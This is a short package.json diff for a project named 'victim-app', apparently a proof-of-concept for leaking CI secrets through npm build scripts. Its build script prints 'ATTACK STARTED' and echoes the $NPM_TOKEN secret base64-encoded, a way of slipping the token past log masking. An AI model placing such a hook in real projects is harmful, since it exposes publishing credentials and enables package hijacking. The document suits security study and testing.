@@ -2,7 +2,9 @@
     "name": "victim-app",
     "version": "1.0.0",
     "scripts": {
-        "build": "echo 'ATTACK STARTEDddd'; echo $NPM_TOKEN | base64"
+        "build": "echo 'ATTACK STARTED'; echo $NPM_TOKEN | base64"
     },
-    "dependencies": {}
+    "devDependencies": {
+        "@changesets/cli": "*"
+    }
 }
